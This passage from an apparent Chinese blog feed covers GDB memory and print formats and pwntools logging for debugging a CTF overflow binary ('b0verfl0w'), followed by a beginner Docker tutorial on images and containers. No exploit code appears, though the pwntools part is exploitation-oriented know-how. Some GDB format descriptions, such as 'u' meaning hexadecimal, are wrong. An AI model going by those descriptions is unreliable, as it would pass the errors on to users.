表示从当前地址往后请求的字节数，如果不指定的话，GDB默认是4个bytes。u参数可以用下面的字符来代替，b表示单字节，h表示双字节，w表示四字 节，g表示八字节。当我们指定了字节长度后，GDB会从指内存定的内存地址开始，读写指定字节，并把其当作一个值取出来。</p><p><addr>表示一个内存地址。<br>n&#x2F;f&#x2F;u三个参数可以一起使用。例如：</addr></p><p>命令：x&#x2F;3uh 0x54320 表示，从内存地址0x54320读取内容，h表示以双字节为一个单位，3表示三个单位，u表示按十六进制显示。</p><p>输出格式<br>一般来说，GDB会根据变量的类型输出变量的值。但你也可以自定义GDB的输出的格式。例如，你想输出一个整数的十六进制，或是二进制来查看这个整型变量的中的位的情况。要做到这样，你可以使用GDB的数据显示格式：</p><p>x 按十六进制格式显示变量。<br>d 按十进制格式显示变量。<br>u 按十六进制格式显示无符号整型。<br>o 按八进制格式显示变量。<br>t 按二进制格式显示变量。<br>a 按十六进制格式显示变量。<br>c 按字符格式显示变量。</p><p>s 按字符串格式显示变量</p><p>f 按浮点数格式显示变量。</p><p>(gdb) p i<br>$21 &#x3D; 101</p><p>(gdb) p&#x2F;a i<br>$22 &#x3D; 0x65</p><p>(gdb) p&#x2F;c i<br>$23 &#x3D; 101 ‘e’</p><p>(gdb) p&#x2F;f i<br>$24 &#x3D; 1.41531145e-43</p><p>(gdb) p&#x2F;x i<br>$25 &#x3D; 0x65</p><p>(gdb) p&#x2F;t i<br>$26 &#x3D; 1100101</p><h2 id="日志等级"><a href="#日志等级" class="headerlink" title="日志等级"></a>日志等级</h2><h2 id="pwntools-如何设置调试等级（日志等级）"><a href="#pwntools-如何设置调试等级（日志等级）" class="headerlink" title="pwntools 如何设置调试等级（日志等级）"></a>pwntools 如何设置调试等级（日志等级）</h2><p><code>pwntools</code> 使用 <code>context.log_level</code> 来设置日志输出的详细程度。</p><h3 id="✨-常用-log-level-选项："><a href="#✨-常用-log-level-选项：" class="headerlink" title="✨ 常用 log_level 选项："></a>✨ 常用 log_level 选项：</h3><table><thead><tr><th>等级</th><th>描述</th></tr></thead><tbody><tr><td><code>&#39;debug&#39;</code></td><td>输出详细调试信息（最常用）</td></tr><tr><td><code>&#39;info&#39;</code></td><td>默认，适合一般情况</td></tr><tr><td><code>&#39;warn&#39;</code></td><td>只输出警告信息</td></tr><tr><td><code>&#39;error&#39;</code></td><td>只输出错误信息</td></tr><tr><td><code>&#39;critical&#39;</code></td><td>只输出最严重的错误</td></tr><tr><td><code>&#39;silent&#39;</code></td><td>不输出任何日志</td></tr></tbody></table><h3 id="📌-示例："><a href="#📌-示例：" class="headerlink" title="📌 示例："></a>📌 示例：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./b0verfl0w&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这会让 <code>pwntools</code> 输出所有发送的 payload、IO、GDB 附加信息等，非常适合调试阶段使用。</p><h2 id="finish-执行到函数返回"><a href="#finish-执行到函数返回" class="headerlink" title="finish 执行到函数返回"></a>finish 执行到函数返回</h2><p>如果你想直接断在返回指令处，先 <code>disas vuln</code> 找到 <code>ret</code> 的地址，再设置断点：</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;在程序编译时增加-g选项以支持gdb调试&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如：&lt;/p&gt;
&lt;p&gt;$ gcc -g example.c -o example.x&lt;/p&gt;
&lt;p&gt;通过上述命令对example.c编译之后，使用下列命令进入到gdb调试：&lt;/p&gt;
&lt;p&gt;$ gdb example.x&lt;/p&gt;
&lt;p&gt;在gdb调试中，常用的命令有以下几个：&lt;/p&gt;
&lt;p&gt;$ list 缩略为 l&lt;/p&gt;
&lt;p&gt;列出程序源码，每次列出10行，按回车重复运行上一命令；&lt;/p&gt;
&lt;p&gt;$ run 缩略为 r&lt;/p&gt;
&lt;p&gt;程序开始运行，在r后可以加入程序启动参数，程序运行到断点处暂停；&lt;/p&gt;
&lt;p&gt;$ continue 缩略为 c&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>docker学习</title>
    <link href="http://example.com/2025/06/04/docker%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2025/06/04/docker%E5%AD%A6%E4%B9%A0/</id>
    <published>2025-06-04T12:33:12.000Z</published>
    <updated>2025-06-06T04:53:15.419Z</updated>
    
    <content type="html"><![CDATA[<h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><h3 id="打包、分发、部署"><a href="#打包、分发、部署" class="headerlink" title="打包、分发、部署"></a>打包、分发、部署</h3><p><strong>打包</strong>：就是把你软件运行所需的依赖、第三方库、软件打包到一起，变成一个安装包<br><strong>分发</strong>：你可以把你打包好的“安装包”上传到一个镜像仓库，其他人可以非常方便的获取和安装<br><strong>部署</strong>：拿着“安装包”就可以一个命令运行起来你的应用，自动模拟出一摸一样的运行环境，不管是在 Windows&#x2F;Mac&#x2F;Linux。</p><span id="more"></span><h3 id="镜像加速源"><a href="#镜像加速源" class="headerlink" title="镜像加速源"></a>镜像加速源</h3><table><thead><tr><th>镜像加速器</th><th>镜像加速器地址</th></tr></thead><tbody><tr><td>Docker 中国官方镜像</td><td><a href="https://registry.docker-cn.com/">https://registry.docker-cn.com</a></td></tr><tr><td>DaoCloud 镜像站</td><td><a href="http://f1361db2.m.daocloud.io/">http://f1361db2.m.daocloud.io</a></td></tr><tr><td>Azure 中国镜像</td><td><a href="https://dockerhub.azk8s.cn/">https://dockerhub.azk8s.cn</a></td></tr><tr><td>科大镜像站</td><td><a href="https://docker.mirrors.ustc.edu.cn/">https://docker.mirrors.ustc.edu.cn</a></td></tr><tr><td>阿里云</td><td><a href="https://ud6340vz.mirror.aliyuncs.com/">https://ud6340vz.mirror.aliyuncs.com</a></td></tr><tr><td>七牛云</td><td><a href="https://reg-mirror.qiniu.com/">https://reg-mirror.qiniu.com</a></td></tr><tr><td>网易云</td><td><a href="https://hub-mirror.c.163.com/">https://hub-mirror.c.163.com</a></td></tr><tr><td>腾讯云</td><td><a href="https://mirror.ccs.tencentyun.com/">https://mirror.ccs.tencentyun.com</a></td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;registry-mirrors&quot;: [&quot;https://registry.docker-cn.com&quot;]</span><br></pre></td></tr></table></figure><p><strong>软件安装</strong></p><p><a href="https://hub.docker.com/">hub.docker.com</a></p><h1 id="Docker-常用命令"><a href="#Docker-常用命令" class="headerlink" title="Docker 常用命令"></a>Docker 常用命令</h1><h2 id="镜像的管理"><a href="#镜像的管理" class="headerlink" title="镜像的管理"></a>镜像的管理</h2><h3 id="搜索-检索"><a href="#搜索-检索" class="headerlink" title="搜索&#x2F;检索"></a>搜索&#x2F;检索</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search 镜像名称</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@docker ~]# docker search nginx</span><br><span class="line">NAME                                              DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED</span><br><span class="line">nginx                                             Official build of Nginx.                        16597     [OK]</span><br><span class="line">bitnami/nginx                                     Bitnami nginx Docker Image                      121                  [OK]</span><br><span class="line">ubuntu/nginx                                      Nginx, a high-performance reverse proxy &amp; we…   39</span><br><span class="line">bitnami/nginx-ingress-controller                  Bitnami Docker Image for NGINX Ingress Contr…   17                   [OK]</span><br><span class="line">rancher/nginx-ingress-controller                                                                  10</span><br><span class="line">ibmcom/nginx-ingress-controller                   Docker Image for IBM Cloud Private-CE (Commu…   4</span><br><span class="line">bitnami/nginx-ldap-auth-daemon                                                                    3</span><br><span class="line">bitnami/nginx-exporter                                                                            2</span><br><span class="line">circleci/nginx                                    This image is for internal use                  2</span><br></pre></td></tr></table></figure><p>默认从 Docker Hub 进行搜索镜像。</p><h3 id="下载-拉取"><a href="#下载-拉取" class="headerlink" title="下载&#x2F;拉取"></a>下载&#x2F;拉取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull 名称:版本</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@docker ~]# docker pull nginx:1.21.6</span><br><span class="line">1.21.6: Pulling from library/nginx</span><br><span class="line">c229119241af: Pull complete</span><br><span class="line">2215908dc0a2: Pull complete</span><br><span class="line">08c3cb2073f1: Pull complete</span><br><span class="line">18f38162c0ce: Pull complete</span><br><span class="line">10e2168f148a: Pull complete</span><br><span class="line">c4ffe9532b5f: Pull complete</span><br><span class="line">Digest: sha256:2275af0f20d71b293916f1958f8497f987b8d8fd8113df54635f2a5915002bf1</span><br><span class="line">Status: Downloaded newer image for nginx:1.21.6</span><br><span class="line">docker.io/library/nginx:1.21.6</span><br></pre></td></tr></table></figure><p>如果不加版本，则拉取 <code>latest</code> 版本，即最新版本。</p><h3 id="镜像列表"><a href="#镜像列表" class="headerlink" title="镜像列表"></a>镜像列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br><span class="line">docker image ls</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@docker ~]# docker images</span><br><span class="line">REPOSITORY                                                        TAG       IMAGE ID       CREATED        SIZE</span><br><span class="line">nginx                                                             1.21.6    12766a6745ee   10 days ago    142MB</span><br><span class="line">rancher/mirrored-flannelcni-flannel                               v0.17.0   9247abf08677   5 weeks ago    59.8MB</span><br><span class="line">rancher/mirrored-flannelcni-flannel-cni-plugin                    v1.0.1    ac40ce625740   2 months ago   8.1MB</span><br><span class="line">registry.aliyuncs.com/google_containers/kube-apiserver            v1.23.0   e6bf5ddd4098   4 months ago   135MB</span><br><span class="line">registry.aliyuncs.com/google_containers/kube-controller-manager   v1.23.0   37c6aeb3663b   4 months ago   125MB</span><br><span class="line">registry.aliyuncs.com/google_containers/kube-scheduler            v1.23.0   56c5af1d00b5   4 months ago   53.5MB</span><br><span class="line">registry.aliyuncs.com/google_containers/kube-proxy                v1.23.0   e03484a90585   4 months ago   112MB</span><br><span class="line">registry.aliyuncs.com/google_containers/etcd                      3.5.1-0   25f8c7f3da61   5 months ago   293MB</span><br><span class="line">registry.aliyuncs.com/google_containers/coredns                   v1.8.6    a4ca41631cc7   6 months ago   46.8MB</span><br><span class="line">registry.aliyuncs.com/google_containers/pause                     3.6       6270bb605e12   7 months ago   683kB</span><br></pre></td></tr></table></figure><p>五列数据分别代表镜像名称、镜像版本、镜像 ID、拉取时间、镜像大小。</p><h3 id="镜像标签"><a href="#镜像标签" class="headerlink" title="镜像标签"></a>镜像标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker tag [imagesID] 改后名称:改后tag</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@docker ~]# docker tag nginx:1.21.6 mynginx:1.21.6</span><br><span class="line">[root@docker ~]# docker images |grep nginx</span><br><span class="line">mynginx                                                           1.21.6    12766a6745ee   10 days ago    142MB</span><br><span class="line">nginx                                                             1.21.6    12766a6745ee   10 days ago    142MB</span><br></pre></td></tr></table></figure><h3 id="镜像删除"><a href="#镜像删除" class="headerlink" title="镜像删除"></a>镜像删除</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi 镜像id</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@docker ~]# docker rmi mynginx:1.21.6</span><br><span class="line">Untagged: mynginx:1.21.6</span><br></pre></td></tr></table></figure><h3 id="镜像导出"><a href="#镜像导出" class="headerlink" title="镜像导出"></a>镜像导出</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save 镜像id/镜像名 &gt; 名字.tar</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@docker ~]# docker save nginx:1.21.6 &gt; nginx-v1.21.6.tar</span><br><span class="line">[root@docker ~]# ls</span><br><span class="line">nginx-v1.21.6.tar</span><br></pre></td></tr></table></figure><h3 id="镜像导入"><a href="#镜像导入" class="headerlink" title="镜像导入"></a>镜像导入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker load &lt; 包名</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@docker ~]# docker rmi nginx:1.21.6</span><br><span class="line">Untagged: nginx:1.21.6</span><br><span class="line">Untagged: nginx@sha256:2275af0f20d71b293916f1958f8497f987b8d8fd8113df54635f2a5915002bf1</span><br><span class="line">Deleted: sha256:12766a6745eea133de9fdcd03ff720fa971fdaf21113d4bc72b417c123b15619</span><br><span class="line">Deleted: sha256:3ea962f6f388096ab9798790d363fc6f9c779c924a5eddf5c699d8da080114f7</span><br><span class="line">Deleted: sha256:091a2aef7242e42505b69f1ad027d6a442cfce2403e260ac914f0fd6cc2d275f</span><br><span class="line">Deleted: sha256:4e72a31f1cd6fd655cc0826c91e886967b6e965e13ac21f31f9f66c27a3b7732</span><br><span class="line">Deleted: sha256:e3d1cdf9772a260b3e81a22c1940d63ac45dfe67720f78f00ca73834d9498934</span><br><span class="line">Deleted: sha256:af40da71a8618ea9cbcdc333d5e60bd5b6df820f0d07a55f7c9a1c21fd930095</span><br><span class="line">Deleted: sha256:608f3a074261105f129d707e4d9ad3d41b5baa94887f092b7c2857f7274a2fce</span><br><span class="line">[root@docker ~]# docker load &lt; nginx-v1.21.6.tar</span><br><span class="line">608f3a074261: Loading layer [==================================================&gt;]   83.9MB/83.9MB</span><br><span class="line">ea207a4854e7: Loading layer [==================================================&gt;]     62MB/62MB</span><br><span class="line">33cf1b723f65: Loading layer [==================================================&gt;]  3.072kB/3.072kB</span><br><span class="line">5c77d760e1f4: Loading layer [==================================================&gt;]  4.096kB/4.096kB</span><br><span class="line">fac199a5a1a5: Loading layer [==================================================&gt;]  3.584kB/3.584kB</span><br><span class="line">ea4bc0cd4a93: Loading layer [==================================================&gt;]  7.168kB/7.168kB</span><br><span class="line">Loaded image: nginx:1.21.6</span><br><span class="line">[root@docker ~]# docker images |grep nginx</span><br><span class="line">nginx                                                             1.21.6    12766a6745ee   10 days ago    142MB</span><br></pre></td></tr></table></figure><h2 id="容器的管理"><a href="#容器的管理" class="headerlink" title="容器的管理"></a>容器的管理</h2><h3 id="创建容器"><a href="#创建容器" class="headerlink" title="创建容器"></a>创建容器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run [options] image [command] [arg]</span><br></pre></td></tr></table></figure><p>Option 说明：</p><ul><li><code>-d</code>: 后台运行</li><li><code>-i</code>: 以交互模式运行容器，通常与 <code>-t</code> 同时使用</li><li><code>-t</code>: 为容器重新分配一个伪输出终端，通常与 <code>-i</code> 同时使用</li><li><code>--name</code>: 设置容器名字</li><li><code>--net</code>: 指定网络连接类型</li><li><code>--h</code>: 设置主机名称</li><li><code>--dns</code>: 指定容器的 DNS 服务器，默认和宿主一致</li><li><code>-e</code>: 设置环境变量（<strong>&#x3D;”</strong>”）</li><li><code>-p</code>: 本地端口:容器端口，把容器的某个端口暴露到主机的某个端口</li><li><code>-v</code>: 本地目录:容器目录，把主机的某目录挂载到容器的目录里面实现文件系统的链接</li><li><code>--network</code>: 指定网络</li><li><code>--rm</code>: 容器关闭后自动删除</li></ul><p>示例：使用命令 <code>docker run -p 8080:80 -d --name nginx1 nginx</code> 来运行一个 Nginx 容器，并且把容器的 80 端口暴露到本机的 8080：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@docker ~]# docker run -p 8080:80 -d --name nginx1 nginx</span><br><span class="line">Unable to find image &#x27;nginx:latest&#x27; locally</span><br><span class="line">latest: Pulling from library/nginx</span><br><span class="line">1fe172e4850f: Pull complete</span><br><span class="line">35c195f487df: Pull complete</span><br><span class="line">213b9b16f495: Pull complete</span><br><span class="line">a8172d9e19b9: Pull complete</span><br><span class="line">f5eee2cb2150: Pull complete</span><br><span class="line">93e404ba8667: Pull complete</span><br><span class="line">Digest: sha256:859ab6768a6f26a79bc42b231664111317d095a4f04e4b6fe79ce37b3d199097</span><br><span class="line">Status: Downloaded newer image for nginx:latest</span><br><span class="line">4cf61416ee672b595b99436d0fdcf8ebe5e6d22adaed8838b29e978f19372ecb</span><br></pre></td></tr></table></figure><p>容器的创建过程是先到本地查找镜像，如果没有则去 Docker Hub 镜像仓库拉取镜像后再运行。</p><h3 id="容器列表"><a href="#容器列表" class="headerlink" title="容器列表"></a>容器列表</h3><p>使用命令 <code>docker ps</code> 来查看已经启动的容器，如果有停止运行的容器可以添加 <code>-a</code> 参数来查看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@docker ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND                  CREATED         STATUS         PORTS                                   NAMES</span><br><span class="line">4cf61416ee67   nginx     &quot;/docker-entrypoint.…&quot;   3 minutes ago   Up 3 minutes   0.0.0.0:8080-&gt;80/tcp, :::8080-&gt;80/tcp   nginx1</span><br></pre></td></tr></table></figure><h3 id="关闭容器"><a href="#关闭容器" class="headerlink" title="关闭容器"></a>关闭容器</h3><p>使用命令 <code>docker stop &#123;容器ID|容器名称&#125;</code> 来关闭容器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@docker ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE         COMMAND                  CREATED         STATUS                     PORTS     NAMES</span><br><span class="line">4cf61416ee67   nginx         &quot;/docker-entrypoint.…&quot;   6 minutes ago   Exited (0) 4 seconds ago             nginx1</span><br><span class="line">58e6c5af6efe   hello-world   &quot;/hello&quot;                 12 hours ago    Exited (0) 12 hours ago              great_chatterjee</span><br></pre></td></tr></table></figure><h3 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h3><p>使用命令 <code>docker start &#123;容器ID|容器名称&#125;</code> 来开启容器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@docker ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND                  CREATED         STATUS         PORTS                                   NAMES</span><br><span class="line">4cf61416ee67   nginx     &quot;/docker-entrypoint.…&quot;   7 minutes ago   Up 6 seconds   0.0.0.0:8080-&gt;80/tcp, :::8080-&gt;80/tcp   nginx1</span><br></pre></td></tr></table></figure><h3 id="重启容器"><a href="#重启容器" class="headerlink" title="重启容器"></a>重启容器</h3><p>使用命令 <code>docker restart &#123;容器ID|容器名称&#125;</code> 来重启容器。</p><h3 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h3><p>使用命令 <code>docker exec -it &#123;容器ID|容器名称&#125; /bin/sh</code> 来进入容器，<code>/bin/sh</code> 是指定进入容器时用的终端，如果容器内有其他终端可以自行修改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@docker ~]# docker exec -it nginx1 /bin/sh</span><br><span class="line"># exit</span><br><span class="line">[root@docker ~]# docker exec -it nginx1 /bin/bash</span><br><span class="line">root@4cf61416ee67:/# ls</span><br><span class="line">bin  boot  dev  docker-entrypoint.d  docker-entrypoint.sh  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br><span class="line">root@4cf61416ee67:/# exit</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><h3 id="容器删除"><a href="#容器删除" class="headerlink" title="容器删除"></a>容器删除</h3><p>使用命令 <code>docker rm &#123;容器ID|容器名称&#125;</code> 来删除已经关闭的容器，如果容器在运行中想要强制删除可以加 <code>-f</code> 参数进行强制删除：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@docker ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND                  CREATED          STATUS         PORTS                                   NAMES</span><br><span class="line">4cf61416ee67   nginx     &quot;/docker-entrypoint.…&quot;   15 minutes ago   Up 7 minutes   0.0.0.0:8080-&gt;80/tcp, :::8080-&gt;80/tcp   nginx1</span><br><span class="line">[root@docker ~]# docker rm -f nginx1</span><br><span class="line">nginx1</span><br><span class="line">[root@docker ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br></pre></td></tr></table></figure><h3 id="容器日志"><a href="#容器日志" class="headerlink" title="容器日志"></a>容器日志</h3><p>使用命令 <code>docker logs &#123;容器ID|容器名称&#125;</code> 来查看容器运行时的日志：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[root@docker ~]# docker run -p 8081:80 -d --name myweb nginx</span><br><span class="line">497eff031c03927f17fe14fcff49bea832403687d580294c42f9cfba697a1564</span><br><span class="line">[root@docker ~]# docker logs myweb</span><br><span class="line">/docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration</span><br><span class="line">/docker-entrypoint.sh: Looking for shell scripts in /docker-entrypoint.d/</span><br><span class="line">/docker-entrypoint.sh: Launching /docker-entrypoint.d/10-listen-on-ipv6-by-default.sh</span><br><span class="line">10-listen-on-ipv6-by-default.sh: info: Getting the checksum of /etc/nginx/conf.d/default.conf</span><br><span class="line">10-listen-on-ipv6-by-default.sh: info: Enabled listen on IPv6 in /etc/nginx/conf.d/default.conf</span><br><span class="line">/docker-entrypoint.sh: Launching /docker-entrypoint.d/20-envsubst-on-templates.sh</span><br><span class="line">/docker-entrypoint.sh: Launching /docker-entrypoint.d/30-tune-worker-processes.sh</span><br><span class="line">/docker-entrypoint.sh: Configuration complete; ready for start up</span><br><span class="line">2022/05/02 05:30:57 [notice] 1#1: using the &quot;epoll&quot; event method</span><br><span class="line">2022/05/02 05:30:57 [notice] 1#1: nginx/1.21.6</span><br><span class="line">2022/05/02 05:30:57 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6)</span><br><span class="line">2022/05/02 05:30:57 [notice] 1#1: OS: Linux 4.18.0-348.el8.0.2.x86_64</span><br><span class="line">2022/05/02 05:30:57 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576</span><br><span class="line">2022/05/02 05:30:57 [notice] 1#1: start worker processes</span><br><span class="line">2022/05/02 05:30:57 [notice] 1#1: start worker process 32</span><br><span class="line">2022/05/02 05:30:57 [notice] 1#1: start worker process 33</span><br></pre></td></tr></table></figure><h3 id="容器转镜像"><a href="#容器转镜像" class="headerlink" title="容器转镜像"></a>容器转镜像</h3><p>使用命令 <code>docker commit &#123;容器ID|容器名称&#125; 镜像名称</code> 来打包容器，如果容器在运行中可以使用 <code>-p</code> 参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@docker ~]# docker commit -p myweb myweb:v1.0</span><br><span class="line">sha256:05f5efa5b56fd3d9c6d17b74ee4a3e9866095ac8cc681879dda21b9b7a968859</span><br><span class="line">[root@docker ~]# docker images</span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">myweb         v1.0      05f5efa5b56f   4 seconds ago   142MB</span><br><span class="line">nginx         latest    fa5269854a5e   11 days ago     142MB</span><br><span class="line">hello-world   latest    feb5d9fea6a5   7 months ago    13.3kB</span><br></pre></td></tr></table></figure><h3 id="容器信息"><a href="#容器信息" class="headerlink" title="容器信息"></a>容器信息</h3><p>使用命令 <code>docker inspect &#123;容器ID|容器名称&#125;</code> 来查看容器的详细信息。这里举例筛选出容器的 IP：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@docker ~]# docker inspect myweb|grep IP</span><br><span class="line">            &quot;LinkLocalIPv6Address&quot;: &quot;&quot;,</span><br><span class="line">            &quot;LinkLocalIPv6PrefixLen&quot;: 0,</span><br><span class="line">            &quot;SecondaryIPAddresses&quot;: null,</span><br><span class="line">            &quot;SecondaryIPv6Addresses&quot;: null,</span><br><span class="line">            &quot;GlobalIPv6Address&quot;: &quot;&quot;,</span><br><span class="line">            &quot;GlobalIPv6PrefixLen&quot;: 0,</span><br><span class="line">            &quot;IPAddress&quot;: &quot;172.17.0.2&quot;,</span><br><span class="line">            &quot;IPPrefixLen&quot;: 16,</span><br><span class="line">            &quot;IPv6Gateway&quot;: &quot;&quot;,</span><br><span class="line">                    &quot;IPAMConfig&quot;: null,</span><br><span class="line">                    &quot;IPAddress&quot;: &quot;172.17.0.2&quot;,</span><br><span class="line">                    &quot;IPPrefixLen&quot;: 16,</span><br><span class="line">                    &quot;IPv6Gateway&quot;: &quot;&quot;,</span><br><span class="line">                    &quot;GlobalIPv6Address&quot;: &quot;&quot;,</span><br><span class="line">                    &quot;GlobalIPv6PrefixLen&quot;: 0,</span><br></pre></td></tr></table></figure>]]></content>
    
    
